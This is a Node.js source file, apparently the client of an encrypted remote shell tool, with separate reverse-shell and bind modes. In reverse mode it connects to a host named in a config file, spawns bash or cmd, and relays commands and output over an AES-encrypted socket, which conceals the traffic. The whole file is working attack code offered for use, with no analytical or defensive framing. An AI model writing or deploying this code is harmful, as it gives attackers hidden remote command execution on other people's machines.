const { createConnection } = require("net");
const { createInterface } = require("readline")
const { spawn } = require("child_process")
const { CryptorAES } = require('./crypt')
const { remote_address, remote_port, aes_password, aes_iv } = require('./client_config.json');

const crypt = new CryptorAES(aes_password, aes_iv)

const config = {
    host: remote_address,
    port: remote_port
}

//convert text to encrypted buffer
function translate_out(cleartext){
    const buffer = Buffer.from(cleartext, 'utf-8')
    const encrypted = crypt.encrypt(buffer)
    return(encrypted)
}

//convert encrypted buffer to text
function translate_in(encBuff){
    const decrypted = crypt.decrypt(encBuff).toString('utf-8')
    return(decrypted)
}

// Bind shell
function Bind (){
    const client = createConnection(config, () => {
        const int = createInterface({
            input: process.stdin,
            output: process.stdout
        })
    
        int.on("line", (data) => {
            client.write(translate_out(data))
        })
    
        int.on("SIGINT", () => {
            client.end()
        })
    
        client.on("data", (data) => {
            console.log(translate_in(data))
        });
         
        client.on("error", (data) => {
            switch(data.code){
                case "ECONNRESET":
                    console.log("INFO:Server connection reset.")
                    process.exit(1)
                default:
                    console.log(`ERROR:${data}`)
                    break
            }
         })
         
        client.on("end", () => { 
            console.log("INFO:Disconnected from server");
            process.exit(0)
        });
    });
}

// Reverse shell
function Reverse (){
    const client = createConnection(config, () => {
        let shellcmd = undefined
        switch(process.platform){
            case "linux":
                shellcmd = "bash"
                break
            case "android":
                shellcmd = "bash"
                break
            case "win32":
                shellcmd = "cmd"
                break
        }
    
        const shell = spawn(shellcmd)
    
        // shell stdout to client
        shell.stdout.on("data", (data) => {
            client.write(translate_out(data))
        })
    
        shell.stderr.on("data", (error) => {
            client.write(translate_out(error))
        })
    
        shell.on("exit", () => {
            process.exit(0)
        })
    
        client.on("data", (data) => {
            shell.stdin.write(`${translate_in(data)}\n`)
        })
    
         
        client.on("error", (data) => {
            switch(data.code){
                case "ECONNRESET":
                    process.exit(1)
                default:
                    console.log(`ERROR:${data}`)
                    process.exit(1)
            }
         })
         
        client.on("end", () => { 
            console.log("INFO:Disconnected from server");
            process.exit(0)
        });
    });
}

switch(process.argv[2]){
    case "b":
        Bind()
        break
    case "r":
        Reverse()
        break
    default:
        const helpText = "Op mode not defined!\n"
        + "Usage:\n"
        + "node client r (Reverse connection)\n"
        + "node client b (Bind connection)"
        
        console.log(helpText)
        process.exit(1)
}